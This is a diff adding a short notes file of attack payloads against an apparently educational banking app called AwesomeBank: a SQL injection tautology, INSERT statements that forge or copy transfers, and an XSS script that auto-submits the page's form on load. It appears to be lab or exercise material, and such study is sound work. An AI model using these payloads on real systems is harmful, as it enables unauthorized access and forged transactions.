@@ -1,0 +1,11 @@
+# SQL Injection:
+
+SELECT * FROM AwesomeBank_transfer WHERE title = 'nazwa' OR '1' = '1'
+
+INSERT INTO AwesomeBank_transfer VALUES (99, 'HAKERSKI PRZELEW', '99999999999999999999999999', 'hahahahahaha', 2137, 
+	'Dec. 2, 2018, 12:25 p.m.', 1)
+
+INSERT INTO AwesomeBank_transfer SELECT * FROM AwesomeBank_preparedtransfer WHERE recipient_name = 'TESTTEST'
+
+XSS:
+<script>window.addEventListener('load', function(){document.getElementsByTagName("form")[0].submit()})</script>
